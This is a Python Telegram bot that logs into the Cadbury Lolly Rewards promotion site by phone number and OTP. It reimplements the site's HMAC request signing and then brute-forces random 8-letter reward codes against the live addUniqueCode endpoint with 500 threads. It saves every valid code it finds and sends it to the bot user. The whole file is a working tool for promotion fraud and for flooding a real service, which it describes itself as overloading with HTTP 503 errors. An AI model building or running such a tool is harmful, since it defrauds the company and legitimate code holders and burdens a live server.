import requests
import json
import base64
import hmac
import hashlib
import time
import urllib.parse
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import threading
import asyncio
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, ConversationHandler, MessageHandler, filters

# ================= CONFIG =================
THREADS = 500
CODE_LENGTH = 8
CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
NOTVALID_FILE = "notvalid.txt"       # global invalid codes
VALID_FILE = "valid_codes.txt"        # global valid codes
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")     # Set BOT_TOKEN in Replit Secrets
# =========================================

# Flask app for Render health checks
flask_app = Flask(__name__)

# Per-user state
user_data = {}
user_lock = threading.Lock()
main_loop = None  # global event loop reference for thread-safe coroutine scheduling

# Global file management (shared across users)
global_tried_codes = set()
global_valid_codes = set()
file_lock = threading.Lock()

# ---------- File loading / saving ----------
def load_global_files():
    global global_tried_codes, global_valid_codes
    if os.path.exists(NOTVALID_FILE):
        with open(NOTVALID_FILE, "r", encoding="utf-8") as f:
            for line in f:
                code = line.strip().split()[0]
                if code:
                    global_tried_codes.add(code)
    if os.path.exists(VALID_FILE):
        with open(VALID_FILE, "r", encoding="utf-8") as f:
            for line in f:
                code = line.strip().split()[0]
                if code:
                    global_valid_codes.add(code)
                    global_tried_codes.add(code)
    print(f"Loaded {len(global_tried_codes)} total tried codes")

def save_to_notvalid(code):
    with file_lock:
        with open(NOTVALID_FILE, "a", encoding="utf-8") as f:
            f.write(f"{code}\n")

def save_valid_code(code):
    with file_lock:
        with open(VALID_FILE, "a", encoding="utf-8") as f:
            f.write(f"{code}\n")
        global_valid_codes.add(code)
        global_tried_codes.add(code)

def is_code_tried(code):
    with file_lock:
        return code in global_tried_codes

def mark_code_tried(code, is_valid=False):
    with file_lock:
        global_tried_codes.add(code)
        if is_valid:
            global_valid_codes.add(code)

# ---------- API functions (no proxy) ----------
def generate_signature_data(payload, user_key, data_key):
    payload_str = json.dumps(payload, separators=(',', ':'))
    a = base64.b64encode(payload_str.encode('utf-8')).decode('utf-8')
    ts = str(payload['t'])
    u = base64.b64encode(ts.encode('utf-8')).decode('utf-8')
    hmac_key = data_key[4:18].encode('utf-8')
    message = f"{u}.{a}".encode('utf-8')
    h = hmac.new(hmac_key, message, hashlib.sha256)
    hex_sig = h.hexdigest()
    f = base64.b64encode(hex_sig.encode('utf-8')).decode('utf-8')
    m = random.randint(1, 6)
    k = random.randint(2, 8)
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    h_rand = "".join(random.choice(alphabet) for _ in range(k))
    g = f"{k}{m}{f[0:m]}{h_rand}{f[m:]}"
    return f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"

def decrypt_response(encrypted_resp):
    try:
        decoded = base64.b64decode(encrypted_resp).decode('utf-8')
        return json.loads(decoded)
    except:
        return {"raw": encrypted_resp, "error": "decode failed"}

def get_user_key(session):
    headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5) AppleWebKit/537.36"}
    r = session.post("https://cadburylollyrewards.com/api/users", json={"masterKey": ""}, headers=headers)
    data = decrypt_response(r.json().get('resp', ''))
    return data.get('userKey'), data.get('dataKey')

def send_otp(session, mobile, user_key, data_key):
    t = int(time.time() * 1000)
    payload = {"mobile": mobile, "userKey": user_key, "t": t}
    post_data = generate_signature_data(payload, user_key, data_key)
    headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
    r = session.post(f"https://cadburylollyrewards.com/api/users/login/{user_key}?t={t}", data=post_data, headers=headers)
    decrypt_response(r.json().get('resp',''))

def verify_otp(session, otp, user_key, data_key):
    t = int(time.time() * 1000)
    payload = {"otp": otp, "userKey": user_key, "t": t}
    post_data = generate_signature_data(payload, user_key, data_key)
    headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
    r = session.post(f"https://cadburylollyrewards.com/api/users/verifyOTP/{user_key}?t={t}", data=post_data, headers=headers)
    result = decrypt_response(r.json().get('resp',''))
    return result.get("accessToken")

def update_user_stats(user_id, is_valid, error_type=None):
    with user_lock:
        ud = user_data.get(user_id)
        if not ud:
            return
        if is_valid:
            ud["valid_count"] += 1
        else:
            ud["invalid_count"] += 1
            if error_type == 503:
                ud["error_503"] += 1
            elif error_type == "connection":
                ud["error_conn"] += 1
            elif error_type == "other":
                ud["error_other"] += 1
        ud["total_checked"] += 1

        # Auto-report every 500 checks
        if ud["total_checked"] - ud["last_report"] >= 500:
            ud["last_report"] = ud["total_checked"]
            report_text = (
                f"📊 *REPORT AFTER {ud['total_checked']} CHECKS*\n"
                f"✅ Valid: {ud['valid_count']}\n"
                f"❌ Invalid total: {ud['invalid_count']}\n"
                f"   ├─ HTTP 503: {ud['error_503']}\n"
                f"   ├─ Connection errors: {ud['error_conn']}\n"
                f"   └─ Other errors: {ud['error_other']}\n"
                f"📈 Total checked: {ud['total_checked']}"
            )
            if main_loop:
                asyncio.run_coroutine_threadsafe(send_message(user_id, report_text), main_loop)

async def send_message(chat_id, text):
    try:
        await application.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")
    except Exception as e:
        print(f"Failed to send message to {chat_id}: {e}")

def try_random_code(user_id):
    """Called by each thread – checks one random code per call."""
    while True:
        with user_lock:
            ud = user_data.get(user_id)
            if not ud or not ud.get("checking_active", False):
                return
            session = ud["session"]
            user_key = ud["user_key"]
            data_key = ud["data_key"]
            access_token = ud["access_token"]
        # Generate unique code (global)
        while True:
            code = ''.join(random.choice(CHARSET) for _ in range(CODE_LENGTH))
            if not is_code_tried(code):
                break
        t = int(time.time() * 1000)
        payload = {"code": code, "userKey": user_key, "t": t}
        headers = {
            "Authorization": f"Bearer {access_token}",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5) AppleWebKit/537.36"
        }
        try:
            post_data = generate_signature_data(payload, user_key, data_key)
            r = session.post(f"https://cadburylollyrewards.com/api/users/addUniqueCode/{user_key}?t={t}",
                             data=post_data, headers=headers, timeout=30)
            if r.status_code == 503:
                mark_code_tried(code, is_valid=False)
                save_to_notvalid(code)
                update_user_stats(user_id, is_valid=False, error_type=503)
                continue
            result = decrypt_response(r.json().get('resp', ''))
            status = result.get("statusCode")
            if status == 200:
                mark_code_tried(code, is_valid=True)
                save_valid_code(code)
                update_user_stats(user_id, is_valid=True)
                if main_loop:
                    asyncio.run_coroutine_threadsafe(send_message(user_id, f"🎉 *VALID CODE FOUND:* `{code}` 🎉"), main_loop)
            else:
                mark_code_tried(code, is_valid=False)
                save_to_notvalid(code)
                update_user_stats(user_id, is_valid=False)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            mark_code_tried(code, is_valid=False)
            save_to_notvalid(code)
            update_user_stats(user_id, is_valid=False, error_type="connection")
        except Exception:
            mark_code_tried(code, is_valid=False)
            save_to_notvalid(code)
            update_user_stats(user_id, is_valid=False, error_type="other")

# ---------- Telegram bot handlers ----------
def make_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Login", callback_data="login")],
        [InlineKeyboardButton("🚀 Start Checking", callback_data="start_check")],
        [InlineKeyboardButton("⏹️ Stop Checking", callback_data="stop_check")],
        [InlineKeyboardButton("📊 Show Stats", callback_data="stats")],
        [InlineKeyboardButton("❓ Explanation", callback_data="explain")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    with user_lock:
        if user_id not in user_data:
            user_data[user_id] = {
                "session": requests.Session(),
                "user_key": None,
                "data_key": None,
                "access_token": None,
                "valid_count": 0,
                "invalid_count": 0,
                "total_checked": 0,
                "error_503": 0,
                "error_conn": 0,
                "error_other": 0,
                "last_report": 0,
                "checking_active": False,
                "executor": None,
                "futures": [],
                "mobile": None,
            }
        already_logged_in = bool(user_data[user_id].get("access_token"))

    if already_logged_in:
        await update.message.reply_text(
            f"✅ Already logged in as `{user_data[user_id].get('mobile')}`.\n\nWhat would you like to do?",
            reply_markup=make_main_keyboard(),
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "Welcome to Cadbury Lolly Rewards Code Checker Bot!\n\n"
        "Press *Login* to begin, or send your mobile number directly (e.g., 9674662450).",
        reply_markup=make_main_keyboard(),
        parse_mode="Markdown"
    )
    return 1  # wait for mobile

async def mobile_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    mobile = update.message.text.strip()
    with user_lock:
        if user_id in user_data:
            user_data[user_id]["mobile"] = mobile
    await update.message.reply_text(f"Mobile number saved: {mobile}\nSending OTP...")
    try:
        with user_lock:
            ud = user_data.get(user_id)
            session = ud["session"]
        user_key, data_key = get_user_key(session)
        send_otp(session, mobile, user_key, data_key)
        with user_lock:
            user_data[user_id]["user_key"] = user_key
            user_data[user_id]["data_key"] = data_key
        await update.message.reply_text("OTP sent! Please enter the OTP you received.")
    except Exception as e:
        print(f"Error sending OTP: {e}")
        await update.message.reply_text(f"Failed to send OTP: {e}\nPlease /start again.")
        return ConversationHandler.END
    return 2

async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    otp = update.message.text.strip()
    await update.message.reply_text("Verifying OTP...")
    try:
        with user_lock:
            ud = user_data.get(user_id)
            if not ud:
                await update.message.reply_text("Session expired. Please /start again.")
                return ConversationHandler.END
            session = ud["session"]
            user_key = ud["user_key"]
            data_key = ud["data_key"]
        access_token = verify_otp(session, otp, user_key, data_key)
        if access_token:
            with user_lock:
                ud["user_key"] = user_key
                ud["data_key"] = data_key
                ud["access_token"] = access_token
            await update.message.reply_text("✅ Login successful! You can now use the buttons to start checking.")
        else:
            await update.message.reply_text("❌ Login failed. Please /start again.")
            return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"Error: {e}\nPlease /start again.")
        return ConversationHandler.END

    # Show main menu again
    keyboard = [
        [InlineKeyboardButton("🔑 Login", callback_data="login")],
        [InlineKeyboardButton("🚀 Start Checking", callback_data="start_check")],
        [InlineKeyboardButton("⏹️ Stop Checking", callback_data="stop_check")],
        [InlineKeyboardButton("📊 Show Stats", callback_data="stats")],
        [InlineKeyboardButton("❓ Explanation", callback_data="explain")]
    ]
    await update.message.reply_text("Main menu:", reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_chat.id
    data = query.data

    with user_lock:
        ud = user_data.get(user_id)
        if not ud:
            await query.edit_message_text("Please /start first.")
            return

    if data == "login":
        await query.edit_message_text("Please send your mobile number (e.g., 9674662450):")
        with user_lock:
            if user_id not in user_data:
                user_data[user_id] = {
                    "session": requests.Session(),
                    "user_key": None, "data_key": None, "access_token": None,
                    "valid_count": 0, "invalid_count": 0, "total_checked": 0,
                    "error_503": 0, "error_conn": 0, "error_other": 0,
                    "last_report": 0, "checking_active": False,
                    "executor": None, "futures": [], "mobile": None,
                }
        context.user_data["awaiting_login_mobile"] = True
        return
    elif data == "start_check":
        if not ud.get("access_token"):
            await query.edit_message_text("❌ Not logged in. Please /start and provide mobile & OTP first.")
            return
        if ud.get("checking_active", False):
            await query.edit_message_text("⚠️ Checking is already running for you!")
            return
        ud["checking_active"] = True
        executor = ThreadPoolExecutor(max_workers=THREADS)
        ud["executor"] = executor
        futures = []
        for _ in range(THREADS):
            futures.append(executor.submit(try_random_code, user_id))
        ud["futures"] = futures
        await query.edit_message_text(
            f"🚀 Started checking with {THREADS} threads.\n"
            "I will notify you when valid codes are found and every 500 checks.\n"
            "Use 'Stop Checking' button to halt."
        )
    elif data == "stop_check":
        if not ud.get("checking_active", False):
            await query.edit_message_text("Checking is not running for you.")
            return
        ud["checking_active"] = False
        if ud.get("executor"):
            ud["executor"].shutdown(wait=False)
        ud["futures"] = []
        await query.edit_message_text("⏹️ Stopped all checking threads for you.")
    elif data == "stats":
        text = (
            "📊 *Your Statistics*\n"
            f"✅ Valid codes: {ud['valid_count']}\n"
            f"❌ Invalid total: {ud['invalid_count']}\n"
            f"   ├─ HTTP 503: {ud['error_503']}\n"
            f"   ├─ Connection errors: {ud['error_conn']}\n"
            f"   └─ Other errors: {ud['error_other']}\n"
            f"📈 Total checks: {ud['total_checked']}\n"
            f"🧵 Threads used: {THREADS}\n"
            f"🔹 Active: {'Yes' if ud.get('checking_active') else 'No'}"
        )
        await query.edit_message_text(text, parse_mode="Markdown")
    elif data == "explain":
        explanation = (
            "*What is a 'thread'?*\n"
            "A thread is like a separate worker that can do one task at a time. "
            "If you use 500 threads, your computer works as if 500 people are simultaneously "
            "trying random codes. This speeds up checking dramatically.\n\n"
            "*Error types:*\n"
            "• HTTP 503 – The server is overloaded (temporary).\n"
            "• Connection errors – Network problems or timeouts.\n"
            "• Other errors – Unexpected issues (e.g., JSON decode).\n\n"
            "*How it works:*\n"
            "The bot logs in once per user, then spawns many threads that each pick a unique 8‑letter code, "
            "send it to the server, and save the result. Every 500 checks you get a report.\n\n"
            "*Valid codes:* They are sent to you immediately and saved globally to `valid_codes.txt`."
        )
        await query.edit_message_text(explanation, parse_mode="Markdown")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    with user_lock:
        ud = user_data.get(user_id)
    if not ud:
        await update.message.reply_text("No session found. Please /start first.")
        return
    logged_in = "✅ Yes" if ud.get("access_token") else "❌ No"
    active = "✅ Running" if ud.get("checking_active") else "⏹️ Stopped"
    text = (
        "🤖 *Bot Status*\n\n"
        f"🔑 Logged in: {logged_in}\n"
        f"📱 Mobile: `{ud.get('mobile') or 'Not set'}`\n"
        f"⚙️ Checking: {active}\n"
        f"🧵 Threads: {THREADS}\n\n"
        f"📊 *Stats*\n"
        f"✅ Valid codes: {ud['valid_count']}\n"
        f"❌ Invalid: {ud['invalid_count']}\n"
        f"📈 Total checked: {ud['total_checked']}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

# ---------- Flask routes for Render ----------
@flask_app.route('/')
def index():
    return "Cadbury Lolly Rewards Bot is running!", 200

@flask_app.route('/health')
def health():
    return jsonify({"status": "ok"}), 200

# ---------- Main entry point ----------
async def run_bot():
    """Start the Telegram bot in polling mode."""
    global application
    try:
        print(f"Starting bot with token: {BOT_TOKEN[:10]}...")
        application = Application.builder().token(BOT_TOKEN).build()
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("start", start)],
            states={
                1: [MessageHandler(filters.TEXT & ~filters.COMMAND, mobile_handler)],
                2: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler)],
            },
            fallbacks=[],
        )
        application.add_handler(conv_handler)
        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(login|start_check|stop_check|stats|explain)$"))
        application.add_handler(CommandHandler("status", status))
        await application.initialize()
        await application.start()
        await application.updater.start_polling()
        print("Bot polling started successfully!")
        # Keep running
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        print(f"Bot startup error: {e}")

if __name__ == "__main__":
    load_global_files()
    # Start the Telegram bot in a background asyncio task
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    main_loop = loop  # expose to threads for run_coroutine_threadsafe
    bot_task = loop.create_task(run_bot())
    # Run Flask in a separate thread (to satisfy Render's port requirement)
    from threading import Thread
    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    # Run asyncio loop forever
    loop.run_forever()
